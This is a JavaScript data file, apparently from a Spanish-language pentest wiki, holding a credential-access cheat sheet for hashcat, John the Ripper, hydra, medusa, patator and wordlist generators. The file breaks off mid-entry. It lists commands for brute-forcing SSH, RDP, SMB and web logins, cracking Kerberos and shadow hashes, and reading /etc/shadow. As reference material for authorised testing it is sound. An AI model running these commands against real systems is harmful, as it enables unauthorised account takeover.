// Acceso a Credenciales (Credential Access)
window.WIKI_CHEATSHEETS_08_CREDENTIAL_ACCESS = [
 {
  "tool": "hashcat",
  "desc": "Recuperador de contraseñas por GPU (el más rápido)",
  "commands": [
   {
    "cmd": "hashcat -I",
    "desc": "Listar dispositivos (GPU/CPU)"
   },
   {
    "cmd": "hashcat -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "hashcat --example-hashes -m 0",
    "desc": "Ejemplos del modo 0"
   },
   {
    "cmd": "hashcat -m 0 hashes.txt rockyou.txt",
    "desc": "MD5 con diccionario"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt rockyou.txt",
    "desc": "NTLM"
   },
   {
    "cmd": "hashcat -m 1400 hashes.txt rockyou.txt",
    "desc": "SHA256"
   },
   {
    "cmd": "hashcat -m 1700 hashes.txt rockyou.txt",
    "desc": "SHA512"
   },
   {
    "cmd": "hashcat -m 1800 hashes.txt rockyou.txt",
    "desc": "sha512crypt (Linux shadow)"
   },
   {
    "cmd": "hashcat -m 500 hashes.txt rockyou.txt",
    "desc": "md5crypt"
   },
   {
    "cmd": "hashcat -m 3200 hashes.txt rockyou.txt",
    "desc": "bcrypt"
   },
   {
    "cmd": "hashcat -m 13100 hashes.txt rockyou.txt",
    "desc": "Kerberoast TGS"
   },
   {
    "cmd": "hashcat -m 18200 hashes.txt rockyou.txt",
    "desc": "AS-REP roast"
   },
   {
    "cmd": "hashcat -m 5600 hashes.txt rockyou.txt",
    "desc": "NetNTLMv2"
   },
   {
    "cmd": "hashcat -m 5500 hashes.txt rockyou.txt",
    "desc": "NetNTLMv1"
   },
   {
    "cmd": "hashcat -m 22000 hash.hc22000 rockyou.txt",
    "desc": "WPA/WPA2 (PMKID/handshake)"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule",
    "desc": "Con reglas best64"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt rockyou.txt -r d3ad0ne.rule",
    "desc": "Reglas d3ad0ne"
   },
   {
    "cmd": "hashcat -m 0 hashes.txt -a 3 ?l?l?l?l?l",
    "desc": "Mask attack 5 minúsculas"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?d?d?s",
    "desc": "Mask personalizada"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt -a 3 --increment -i",
    "desc": "Incrementar longitud"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt",
    "desc": "Combinación de diccionarios"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt -a 0 rockyou.txt -w 4 -O",
    "desc": "Optimizado (OpenCL)"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt -a 6 rockyou.txt ?d?d?d",
    "desc": "Hybrid append"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt -a 7 ?d?d?d rockyou.txt",
    "desc": "Hybrid prepend"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt -a 3 ?d?d?d?d?d?d",
    "desc": "PINs de 6 dígitos"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt --show",
    "desc": "Mostrar crackeados"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt --left",
    "desc": "Mostrar no crackeados"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt -o cracked.txt",
    "desc": "Guardar crackeados"
   },
   {
    "cmd": "hashcat -m 0 hashes.txt rockyou.txt --username",
    "desc": "Hashes con usuarios"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt rockyou.txt --potfile-path pot.txt",
    "desc": "Potfile custom"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt -a 3 '?l?l?l?l?l?l?l?l' --status",
    "desc": "Con estado en vivo"
   },
   {
    "cmd": "hashcat -m 1000 -a 0 hashes.txt rockyou.txt --force",
    "desc": "Forzar ejecución"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt -a 3 ?a?a?a?a?a?a?a?a",
    "desc": "Brute force full 8 chars"
   },
   {
    "cmd": "hashcat -m 3200 hashes.txt rockyou.txt -d 1",
    "desc": "Usar GPU 1"
   },
   {
    "cmd": "hashcat -m 1000 hashes.txt -a 2 -1 ?l?d?u rockyou.txt ?1?1?1",
    "desc": "Custom charset"
   },
   {
    "cmd": "hashcat --identify hash.txt",
    "desc": "Identificar tipo de hash"
   }
  ]
 },
 {
  "tool": "john",
  "desc": "John the Ripper - cracker de contraseñas clásico",
  "commands": [
   {
    "cmd": "john hashes.txt",
    "desc": "Cracking con modos por defecto"
   },
   {
    "cmd": "john --wordlist=rockyou.txt hashes.txt",
    "desc": "Con diccionario"
   },
   {
    "cmd": "john --format=raw-md5 hashes.txt",
    "desc": "Formato específico"
   },
   {
    "cmd": "john --format=nt hashes.txt",
    "desc": "Formato NT"
   },
   {
    "cmd": "john --format=sha512crypt --wordlist=rockyou.txt shadow.txt",
    "desc": "Shadow Linux"
   },
   {
    "cmd": "john --format=krb5tgs --wordlist=rockyou.txt krb.txt",
    "desc": "Kerberoast"
   },
   {
    "cmd": "john --show hashes.txt",
    "desc": "Mostrar crackeados"
   },
   {
    "cmd": "john --status hashes.txt",
    "desc": "Estado del crack"
   },
   {
    "cmd": "john --incremental hashes.txt",
    "desc": "Modo incremental"
   },
   {
    "cmd": "john --mask='?u?l?l?l?d?d' hashes.txt",
    "desc": "Mask attack"
   },
   {
    "cmd": "john --rules=All --wordlist=rockyou.txt hashes.txt",
    "desc": "Con reglas All"
   },
   {
    "cmd": "john --rules=Jumbo --wordlist=rockyou.txt hashes.txt",
    "desc": "Reglas Jumbo"
   },
   {
    "cmd": "john --session=s1 hashes.txt",
    "desc": "Nombrar sesión"
   },
   {
    "cmd": "john --restore=s1",
    "desc": "Restaurar sesión"
   },
   {
    "cmd": "john --fork=4 hashes.txt",
    "desc": "4 procesos paralelos"
   },
   {
    "cmd": "john --pot=custom.pot hashes.txt",
    "desc": "Potfile custom"
   },
   {
    "cmd": "john --list=formats | grep -i nt",
    "desc": "Listar formatos"
   },
   {
    "cmd": "john --list=wordlists",
    "desc": "Listar wordlists"
   },
   {
    "cmd": "john --list=rules",
    "desc": "Listar reglas"
   },
   {
    "cmd": "john hashes.txt --field-separator=':' --format=nt",
    "desc": "Separador custom"
   },
   {
    "cmd": "unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt",
    "desc": "Crackear shadow completo"
   },
   {
    "cmd": "zip2john file.zip > zip.hash && john zip.hash",
    "desc": "Crackear ZIP"
   },
   {
    "cmd": "rar2john file.rar > rar.hash && john rar.hash",
    "desc": "Crackear RAR"
   },
   {
    "cmd": "ssh2john id_rsa > ssh.hash && john ssh.hash",
    "desc": "Crackear clave SSH"
   },
   {
    "cmd": "office2john doc.docx > office.hash && john office.hash",
    "desc": "Crackear Office"
   },
   {
    "cmd": "pdf2john doc.pdf > pdf.hash && john pdf.hash",
    "desc": "Crackear PDF"
   },
   {
    "cmd": "keepass2john db.kdbx > kp.hash && john kp.hash",
    "desc": "Crackear KeePass"
   },
   {
    "cmd": "wpa2john handshake.cap > wpa.hash && john wpa.hash",
    "desc": "Crackear WPA"
   },
   {
    "cmd": "john --test",
    "desc": "Benchmark"
   }
  ]
 },
 {
  "tool": "johnny",
  "desc": "GUI para John the Ripper",
  "commands": [
   {
    "cmd": "johnny",
    "desc": "Abrir GUI"
   },
   {
    "cmd": "johnny --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "hydra",
  "desc": "Fuerza bruta online multisericio (THC-Hydra)",
  "commands": [
   {
    "cmd": "hydra -l admin -P rockyou.txt ssh://192.168.1.10",
    "desc": "SSH con usuario fijo"
   },
   {
    "cmd": "hydra -L users.txt -P passwords.txt ssh://192.168.1.10",
    "desc": "SSH usuarios y passwords"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt ftp://192.168.1.10",
    "desc": "FTP"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt rdp://192.168.1.10",
    "desc": "RDP"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt smb://192.168.1.10",
    "desc": "SMB"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt telnet://192.168.1.10",
    "desc": "Telnet"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt mysql://192.168.1.10",
    "desc": "MySQL"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt postgres://192.168.1.10",
    "desc": "PostgreSQL"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt http-get://objetivo.com/admin",
    "desc": "HTTP GET"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt http-post-form 'http://objetivo.com/login:user=^USER^&pass=^PASS^:F=incorrect'",
    "desc": "HTTP POST form"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt https-post-form 'https://objetivo.com/login:user=^USER^&pass=^PASS^:F=Login failed'",
    "desc": "HTTPS POST"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt smtp://192.168.1.10",
    "desc": "SMTP"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt pop3://192.168.1.10",
    "desc": "POP3"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt imap://192.168.1.10",
    "desc": "IMAP"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt vnc://192.168.1.10",
    "desc": "VNC"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt ldap2://192.168.1.10",
    "desc": "LDAP"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt snmp://192.168.1.10",
    "desc": "SNMP"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt -t 4 ssh://192.168.1.10",
    "desc": "4 hilos"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt -f ssh://192.168.1.10",
    "desc": "Parar al primer hallazgo"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt -v ssh://192.168.1.10",
    "desc": "Verbose"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt -o results.txt ssh://192.168.1.10",
    "desc": "Guardar resultados"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt -s 2222 ssh://192.168.1.10",
    "desc": "Puerto custom"
   },
   {
    "cmd": "hydra -L users.txt -P pass.txt -e nsr ssh://192.168.1.10",
    "desc": "Pruebas nulas/iguales/reverse"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt -W 5 ssh://192.168.1.10",
    "desc": "Wait de 5s entre hilos"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt -w 30 ssh://192.168.1.10",
    "desc": "Timeout 30s"
   },
   {
    "cmd": "hydra -I -l admin -P rockyou.txt ssh://192.168.1.10",
    "desc": "Ignorar restore file"
   },
   {
    "cmd": "hydra -R -l admin -P rockyou.txt ssh://192.168.1.10",
    "desc": "Restaurar sesión"
   },
   {
    "cmd": "hydra -l admin -P rockyou.txt -M targets.txt ssh",
    "desc": "Múltiples targets"
   },
   {
    "cmd": "hydra -C user:pass.txt ssh://192.168.1.10",
    "desc": "Archivo user:pass"
   },
   {
    "cmd": "hydra -U http-post-form",
    "desc": "Ayuda del módulo http-post-form"
   }
  ]
 },
 {
  "tool": "medusa",
  "desc": "Fuerza bruta paralela multisericio",
  "commands": [
   {
    "cmd": "medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ssh",
    "desc": "SSH"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ftp",
    "desc": "FTP"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -u admin -P pass.txt -M mysql",
    "desc": "MySQL"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -u admin -P pass.txt -M smbnt",
    "desc": "SMB"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -u admin -P pass.txt -M rdp",
    "desc": "RDP"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -u admin -P pass.txt -M http -m DIR:/admin",
    "desc": "HTTP"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -u admin -P pass.txt -M pop3",
    "desc": "POP3"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -u admin -P pass.txt -M telnet",
    "desc": "Telnet"
   },
   {
    "cmd": "medusa -H hosts.txt -U users.txt -P pass.txt -M ssh",
    "desc": "Múltiples hosts"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ssh -t 10",
    "desc": "10 tasks"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ssh -f",
    "desc": "Parar en hallazgo"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ssh -v",
    "desc": "Verbose"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ssh -O out.txt",
    "desc": "Salida a archivo"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -u admin -P pass.txt -M ssh -n 2222",
    "desc": "Puerto custom"
   },
   {
    "cmd": "medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ssh -r 3",
    "desc": "Reintentos"
   }
  ]
 },
 {
  "tool": "ncrack",
  "desc": "Cracker de autenticación de alta velocidad (RDP, SSH, FTP...)",
  "commands": [
   {
    "cmd": "ncrack -p 22 -U users.txt -P pass.txt 192.168.1.10",
    "desc": "SSH"
   },
   {
    "cmd": "ncrack -p 3389 --user admin -P pass.txt 192.168.1.10",
    "desc": "RDP"
   },
   {
    "cmd": "ncrack -p 21 -U users.txt -P pass.txt 192.168.1.10",
    "desc": "FTP"
   },
   {
    "cmd": "ncrack -p 445 -U users.txt -P pass.txt 192.168.1.10",
    "desc": "SMB"
   },
   {
    "cmd": "ncrack -p 443 --user admin -P pass.txt https://objetivo.com",
    "desc": "HTTPS"
   },
   {
    "cmd": "ncrack -p 5900 -U users.txt -P pass.txt 192.168.1.10",
    "desc": "VNC"
   },
   {
    "cmd": "ncrack -p 22 -U users.txt -P pass.txt -T 10 192.168.1.10",
    "desc": "10 conexiones"
   },
   {
    "cmd": "ncrack -p 22 -U users.txt -P pass.txt -t 5 192.168.1.10",
    "desc": "Timeout 5s"
   },
   {
    "cmd": "ncrack -p 22 -U users.txt -P pass.txt -f 192.168.1.10",
    "desc": "Quit al primer éxito"
   },
   {
    "cmd": "ncrack -p 22 -U users.txt -P pass.txt -oN out.txt 192.168.1.10",
    "desc": "Guardar"
   },
   {
    "cmd": "ncrack -p 22 -U users.txt -P pass.txt -v 192.168.1.10",
    "desc": "Verbose"
   },
   {
    "cmd": "ncrack -p 22 -U users.txt -P pass.txt -r 3 192.168.1.10",
    "desc": "Reintentos"
   },
   {
    "cmd": "ncrack -p ssh,rdp,vnc -U users.txt -P pass.txt 192.168.1.10",
    "desc": "Multi-servicio"
   }
  ]
 },
 {
  "tool": "crowbar",
  "desc": "Fuerza bruta con soporte de claves privadas (RDP, SSH, VNC)",
  "commands": [
   {
    "cmd": "crowbar -b ssh -u admin -p pass -s 192.168.1.10/32",
    "desc": "SSH"
   },
   {
    "cmd": "crowbar -b rdp -u admin -p pass -s 192.168.1.10/32",
    "desc": "RDP"
   },
   {
    "cmd": "crowbar -b vnc -p pass -s 192.168.1.10/32",
    "desc": "VNC"
   },
   {
    "cmd": "crowbar -b sshkey -u root -k keys.txt -s 192.168.1.10/32",
    "desc": "SSH con claves"
   },
   {
    "cmd": "crowbar -b ssh -U users.txt -P pass.txt -s 192.168.1.10/32",
    "desc": "Lists de users/pass"
   },
   {
    "cmd": "crowbar -b rdp -u admin -P pass.txt -s 192.168.1.0/24",
    "desc": "Subred completa"
   },
   {
    "cmd": "crowbar -b ssh -u admin -p pass -s 192.168.1.10/32 -t 10",
    "desc": "10 hilos"
   },
   {
    "cmd": "crowbar -b ssh -u admin -p pass -s 192.168.1.10/32 -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "crowbar -b ssh -u admin -p pass -s 192.168.1.10/32 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "crowbar -b ssh -u admin -p pass -s 192.168.1.10/32 -n 2222",
    "desc": "Puerto custom"
   }
  ]
 },
 {
  "tool": "patator",
  "desc": "Fuerza bruta multi-módulo (Patator) con Python",
  "commands": [
   {
    "cmd": "patator ssh_login host=192.168.1.10 user=admin password=FILE0 0=pass.txt",
    "desc": "SSH"
   },
   {
    "cmd": "patator ftp_login host=192.168.1.10 user=admin password=FILE0 0=pass.txt",
    "desc": "FTP"
   },
   {
    "cmd": "patator http_fuzz url='http://objetivo.com/?id=FILE0' 0=ids.txt",
    "desc": "Fuzzing HTTP"
   },
   {
    "cmd": "patator http_fuzz url='http://objetivo.com/login' method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:code=200",
    "desc": "POST fuzz"
   },
   {
    "cmd": "patator smb_login host=192.168.1.10 user=admin password=FILE0 0=pass.txt",
    "desc": "SMB"
   },
   {
    "cmd": "patator rdp_login host=192.168.1.10 user=admin password=FILE0 0=pass.txt",
    "desc": "RDP"
   },
   {
    "cmd": "patator mysql_login host=192.168.1.10 user=admin password=FILE0 0=pass.txt",
    "desc": "MySQL"
   },
   {
    "cmd": "patator vnc_login host=192.168.1.10 password=FILE0 0=pass.txt",
    "desc": "VNC"
   },
   {
    "cmd": "patator snmp_login host=192.168.1.10 version=2c community=FILE0 0=communities.txt",
    "desc": "SNMP"
   },
   {
    "cmd": "patator dns_brute host=objetivo.com subdomains=FILE0 0=subs.txt",
    "desc": "DNS brute"
   },
   {
    "cmd": "patator -t 10 ssh_login host=192.168.1.10 user=admin password=FILE0 0=pass.txt",
    "desc": "10 hilos"
   },
   {
    "cmd": "patator -x ignore:mesg='Login incorrect' ssh_login host=192.168.1.10 user=admin password=FILE0 0=pass.txt",
    "desc": "Filtrar por mensaje"
   },
   {
    "cmd": "patator -x free,print,retry:code=1 ssh_login ...",
    "desc": "Retry en error"
   },
   {
    "cmd": "patator --max-retries 3 ssh_login ...",
    "desc": "Máximo de reintentos"
   },
   {
    "cmd": "patator -o out.txt ssh_login ...",
    "desc": "Guardar"
   }
  ]
 },
 {
  "tool": "legba",
  "desc": "Fuerza bruta multi-protocolo en Rust (moderno y rápido)",
  "commands": [
   {
    "cmd": "legba ssh --target 192.168.1.10:22 --username admin --password-file pass.txt",
    "desc": "SSH"
   },
   {
    "cmd": "legba ftp --target 192.168.1.10 --username admin --password-file pass.txt",
    "desc": "FTP"
   },
   {
    "cmd": "legba rdp --target 192.168.1.10 --username admin --password-file pass.txt",
    "desc": "RDP"
   },
   {
    "cmd": "legba mysql --target 192.168.1.10:3306 --username root --password-file pass.txt",
    "desc": "MySQL"
   },
   {
    "cmd": "legba http-post-form --target http://objetivo.com/login --data 'user=admin&pass=^PASS^' --fail-code 200",
    "desc": "HTTP form"
   },
   {
    "cmd": "legba smb --target 192.168.1.10 --username admin --password-file pass.txt",
    "desc": "SMB"
   },
   {
    "cmd": "legba ssh --target 192.168.1.10:22 --userlist users.txt --password-file pass.txt --threads 20",
    "desc": "20 hilos"
   },
   {
    "cmd": "legba ssh --target 192.168.1.10:22 --username admin --password-file pass.txt --output out.txt",
    "desc": "Guardar"
   },
   {
    "cmd": "legba ssh --target 192.168.1.10:22 --username admin --password-file pass.txt --verbose",
    "desc": "Verbose"
   },
   {
    "cmd": "legba --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "hashid",
  "desc": "Identificar el tipo de hash",
  "commands": [
   {
    "cmd": "hashid '$1$abc$...'",
    "desc": "Identificar hash"
   },
   {
    "cmd": "hashid -m '$1$abc$...'",
    "desc": "Mostrar modo hashcat"
   },
   {
    "cmd": "hashid -j '$1$abc$...'",
    "desc": "Mostrar modo John"
   },
   {
    "cmd": "hashid -e '$1$abc$...'",
    "desc": "Mostrar todos los modos"
   },
   {
    "cmd": "hashid -m -j '$1$abc$...'",
    "desc": "Con ambos"
   },
   {
    "cmd": "hashid hash.txt",
    "desc": "Desde archivo"
   },
   {
    "cmd": "cat hashes.txt | hashid",
    "desc": "Desde stdin"
   },
   {
    "cmd": "hashid --extended hash.txt",
    "desc": "Modo extendido"
   }
  ]
 },
 {
  "tool": "hash-identifier",
  "desc": "Identificador de tipos de hash (interactivo)",
  "commands": [
   {
    "cmd": "hash-identifier",
    "desc": "Abrir herramienta interactiva"
   },
   {
    "cmd": "hash-identifier < hash.txt",
    "desc": "Desde stdin"
   }
  ]
 },
 {
  "tool": "cewl",
  "desc": "Generar wordlists personalizadas desde el contenido web",
  "commands": [
   {
    "cmd": "cewl https://objetivo.com -w wordlist.txt",
    "desc": "Generar wordlist del sitio"
   },
   {
    "cmd": "cewl https://objetivo.com -d 3",
    "desc": "Profundidad de 3"
   },
   {
    "cmd": "cewl https://objetivo.com -m 5",
    "desc": "Palabras de 5+ chars"
   },
   {
    "cmd": "cewl https://objetivo.com --with-numbers",
    "desc": "Incluir palabras con números"
   },
   {
    "cmd": "cewl https://objetivo.com -e",
    "desc": "Extraer emails"
   },
   {
    "cmd": "cewl https://objetivo.com -e -o emails.txt",
    "desc": "Guardar emails"
   },
   {
    "cmd": "cewl https://objetivo.com -a",
    "desc": "Crawl todo el sitio"
   },
   {
    "cmd": "cewl https://objetivo.com -u 'User-Agent'",
    "desc": "User-Agent custom"
   },
   {
    "cmd": "cewl https://objetivo.com -c",
    "desc": "Con recuento de frecuencia"
   },
   {
    "cmd": "cewl https://objetivo.com -x 3",
    "desc": "Máximo de palabras"
   },
   {
    "cmd": "cewl https://objetivo.com --lowercase",
    "desc": "Minúsculas"
   },
   {
    "cmd": "cewl https://objetivo.com -w out.txt --email_format x",
    "desc": "Formato de emails"
   },
   {
    "cmd": "cewl -m 6 -w wl.txt https://objetivo.com/login",
    "desc": "Desde página específica"
   },
   {
    "cmd": "cewl https://objetivo.com -k",
    "desc": "Saltar verificaciones SSL"
   },
   {
    "cmd": "cewl https://objetivo.com --auth user:pass",
    "desc": "Con autenticación"
   },
   {
    "cmd": "cewl https://objetivo.com --proxy 127.0.0.1:8080",
    "desc": "Vía proxy"
   },
   {
    "cmd": "cewl -r -m 5 -w wl.txt https://objetivo.com",
    "desc": "Descargar y analizar"
   },
   {
    "cmd": "cewl -v https://objetivo.com -w wl.txt",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "crunch",
  "desc": "Generador de wordlists basado en patrones",
  "commands": [
   {
    "cmd": "crunch 8 8 0123456789 -o pins.txt",
    "desc": "PINs de 8 dígitos"
   },
   {
    "cmd": "crunch 4 6 abcdef -o out.txt",
    "desc": "Rango 4-6 de abcdef"
   },
   {
    "cmd": "crunch 8 8 -t @@@@%%%% -o out.txt",
    "desc": "Patrón: minúsculas+números"
   },
   {
    "cmd": "crunch 8 8 -t empresa@@@@",
    "desc": "Prefijo fijo + 4 letras"
   },
   {
    "cmd": "crunch 8 8 -t @@@@!%%%",
    "desc": "Con símbolo fijo"
   },
   {
    "cmd": "crunch 8 8 -t pass@@@@ -p empresa",
    "desc": "Con permutaciones"
   },
   {
    "cmd": "crunch 6 6 -p abc def ghi",
    "desc": "Permutaciones de palabras"
   },
   {
    "cmd": "crunch 10 10 -f /usr/share/crunch/charset.lst mixalpha-numeric -o out.txt",
    "desc": "Charset de archivo"
   },
   {
    "cmd": "crunch 8 8 -t @@@@@%%% -s abc",
    "desc": "Empezar desde string"
   },
   {
    "cmd": "crunch 8 8 -t @@@@%%%% -e zzzz9999",
    "desc": "Parar en string"
   },
   {
    "cmd": "crunch 8 8 -t @@@@@@@@ -z gzip -o out.gz",
    "desc": "Comprimir salida"
   },
   {
    "cmd": "crunch 8 8 -t @@@@%%%% -b 10mb -o out.txt",
    "desc": "Partir en archivos de 10MB"
   },
   {
    "cmd": "crunch 8 8 -t @@@%%%@@ -c 1000 -o out.txt",
    "desc": "Máximo 1000 líneas por archivo"
   },
   {
    "cmd": "crunch 5 5 -t %%%%@ -p root",
    "desc": "Mezcla con palabra"
   },
   {
    "cmd": "crunch 0 0 -p hola mundo",
    "desc": "Solo permutaciones"
   }
  ]
 },
 {
  "tool": "rsmangler",
  "desc": "Generar variaciones de palabras (mutaciones) para wordlists",
  "commands": [
   {
    "cmd": "rsmangler -f base.txt -o mutated.txt",
    "desc": "Mutaciones de base"
   },
   {
    "cmd": "rsmangler -f base.txt --all",
    "desc": "Todas las mutaciones"
   },
   {
    "cmd": "rsmangler -f base.txt --suffix",
    "desc": "Solo sufijos"
   },
   {
    "cmd": "rsmangler -f base.txt --prefix",
    "desc": "Solo prefijos"
   },
   {
    "cmd": "rsmangler -f base.txt --leet",
    "desc": "Solo leetspeak"
   },
   {
    "cmd": "rsmangler -f base.txt --reverse",
    "desc": "Solo reversos"
   },
   {
    "cmd": "rsmangler -f base.txt --capital",
    "desc": "Solo capitalización"
   },
   {
    "cmd": "rsmangler -f base.txt -m 4",
    "desc": "Longitud mínima 4"
   },
   {
    "cmd": "rsmangler -f base.txt -x 12",
    "desc": "Longitud máxima 12"
   },
   {
    "cmd": "rsmangler -f base.txt -v",
    "desc": "Verbose"
   },
   {
    "cmd": "rsmangler -f base.txt --max 100000",
    "desc": "Máximo de 100k palabras"
   }
  ]
 },
 {
  "tool": "bopscrk",
  "desc": "Generar wordlists personalizadas combinando datos personales",
  "commands": [
   {
    "cmd": "bopscrk -i",
    "desc": "Generar interactivo"
   },
   {
    "cmd": "bopscrk -t empresa -k juan",
    "desc": "Keywords"
   },
   {
    "cmd": "bopscrk -t 'empresa' --min 6 --max 12",
    "desc": "Rango de longitud"
   },
   {
    "cmd": "bopscrk -t empresa --leet",
    "desc": "Con leetspeak"
   },
   {
    "cmd": "bopscrk -t empresa --capitalize",
    "desc": "Con mayúsculas"
   },
   {
    "cmd": "bopscrk -t empresa --common",
    "desc": "Con palabras comunes"
   },
   {
    "cmd": "bopscrk -t empresa --dates",
    "desc": "Con fechas"
   },
   {
    "cmd": "bopscrk -t empresa --nsize 3",
    "desc": "Combinaciones de 3"
   },
   {
    "cmd": "bopscrk -t empresa -o out.txt",
    "desc": "Guardar wordlist"
   },
   {
    "cmd": "bopscrk -t empresa --separator '_'",
    "desc": "Separador"
   }
  ]
 },
 {
  "tool": "maskgen",
  "desc": "Generar máscaras de ataque desde un diccionario (PACK)",
  "commands": [
   {
    "cmd": "maskgen rockyou.txt",
    "desc": "Generar máscaras de rockyou"
   },
   {
    "cmd": "maskgen rockyou.txt --minlength 8",
    "desc": "Longitud mínima 8"
   },
   {
    "cmd": "maskgen rockyou.txt --maxlength 12",
    "desc": "Longitud máxima"
   },
   {
    "cmd": "maskgen rockyou.txt --minoccurrence 50",
    "desc": "Mínima ocurrencia"
   },
   {
    "cmd": "maskgen rockyou.txt --showmasks",
    "desc": "Mostrar máscaras"
   },
   {
    "cmd": "maskgen rockyou.txt --output out.masks",
    "desc": "Guardar máscaras"
   },
   {
    "cmd": "maskgen rockyou.txt --top 100",
    "desc": "Top 100 máscaras"
   }
  ]
 },
 {
  "tool": "policygen",
  "desc": "Generar diccionarios basados en políticas de contraseñas",
  "commands": [
   {
    "cmd": "policygen --minlength 8 --maxlength 12 --digit --lower --upper --symbols -o wl.txt",
    "desc": "Wordlist según política"
   },
   {
    "cmd": "policygen --minlength 10 --maxlength 10 --lower --digit -o pins.txt",
    "desc": "10 chars lower+digit"
   },
   {
    "cmd": "policygen --minlength 8 --maxlength 14 --mustinclude 1 --mustinclude ! -o out.txt",
    "desc": "Con símbolos"
   },
   {
    "cmd": "policygen --minlength 8 --maxlength 14 --minoccurrence 2 -o out.txt",
    "desc": "Frecuencia mínima"
   },
   {
    "cmd": "policygen -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "statsgen",
  "desc": "Análisis estadístico de wordlists (PACK)",
  "commands": [
   {
    "cmd": "statsgen rockyou.txt",
    "desc": "Análisis de rockyou"
   },
   {
    "cmd": "statsgen rockyou.txt --output report.html",
    "desc": "Reporte HTML"
   },
   {
    "cmd": "statsgen rockyou.txt --minlength 6",
    "desc": "Longitud mínima"
   },
   {
    "cmd": "statsgen rockyou.txt --maxlength 10",
    "desc": "Longitud máxima"
   },
   {
    "cmd": "statsgen rockyou.txt --simple",
    "desc": "Salida simple"
   },
   {
    "cmd": "statsgen rockyou.txt --charset",
    "desc": "Mostrar charset"
   }
  ]
 },
 {
  "tool": "wordlists",
  "desc": "Colección de wordlists de Kali (/usr/share/wordlists)",
  "commands": [
   {
    "cmd": "ls /usr/share/wordlists/",
    "desc": "Explorar wordlists"
   },
   {
    "cmd": "ls /usr/share/wordlists/metasploit/",
    "desc": "Wordlists de Metasploit"
   },
   {
    "cmd": "gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt",
    "desc": "Descomprimir rockyou"
   },
   {
    "cmd": "wc -l /usr/share/wordlists/rockyou.txt",
    "desc": "Líneas de rockyou"
   },
   {
    "cmd": "head -10 /usr/share/wordlists/rockyou.txt",
    "desc": "Ver primeras líneas"
   },
   {
    "cmd": "find /usr/share/wordlists -name '*.txt'",
    "desc": "Encontrar wordlists"
   },
   {
    "cmd": "head -5000 /usr/share/wordlists/rockyou.txt > mini.txt",
    "desc": "Crear wordlist pequeña"
   },
   {
    "cmd": "grep -i 'admin' /usr/share/wordlists/rockyou.txt",
    "desc": "Buscar palabras"
   },
   {
    "cmd": "sort -u /usr/share/wordlists/rockyou.txt > unica.txt",
    "desc": "Wordlist única"
   }
  ]
 },
 {
  "tool": "seclists",
  "desc": "Colección masiva de wordlists (SecLists)",
  "commands": [
   {
    "cmd": "ls /usr/share/seclists/",
    "desc": "Explorar SecLists"
   },
   {
    "cmd": "ls /usr/share/seclists/Discovery/Web-Content/",
    "desc": "Wordlists web"
   },
   {
    "cmd": "ls /usr/share/seclists/Passwords/",
    "desc": "Wordlists de passwords"
   },
   {
    "cmd": "ls /usr/share/seclists/Usernames/",
    "desc": "Wordlists de usuarios"
   },
   {
